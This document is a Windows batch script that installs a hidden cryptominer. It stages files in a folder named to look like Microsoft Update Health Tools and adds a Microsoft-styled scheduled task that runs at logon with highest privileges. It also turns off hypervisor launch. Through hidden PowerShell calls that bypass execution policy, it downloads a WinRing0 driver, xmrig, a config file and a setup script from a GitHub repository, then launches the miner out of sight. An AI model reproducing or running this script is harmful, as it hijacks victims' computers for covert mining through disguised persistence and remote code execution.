@echo off
cd /d "%~dp0"
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"
if not exist "%STAGE%" mkdir "%STAGE%"

schtasks /query /tn "\Microsoft\Windows\UpdateHealthTools" >nul 2>&1 || schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\System32\cmd.exe /c \"%STAGE%\main.cmd\"" /sc onlogon /rl highest /f >nul 2>&1

bcdedit /set hypervisorlaunchtype off

if not exist "%STAGE%\WinRing0x64.sys" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/WinRing0x64.sys' -OutFile '%STAGE%\WinRing0x64.sys' -UseBasicParsing"

if not exist "%STAGE%\xmrig.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/xmrig.exe' -OutFile '%STAGE%\xmrig.exe' -UseBasicParsing"

if not exist "%STAGE%\config.json" (
  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/config.json' -OutFile '%STAGE%\config.json' -UseBasicParsing"
  if not exist "%STAGE%\gen.ps1" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/gen.ps1' -OutFile '%STAGE%\gen.ps1' -UseBasicParsing"
  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -File "%STAGE%\gen.ps1"
)

cd /d "%STAGE%"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\xmrig.exe' -WindowStyle Hidden"
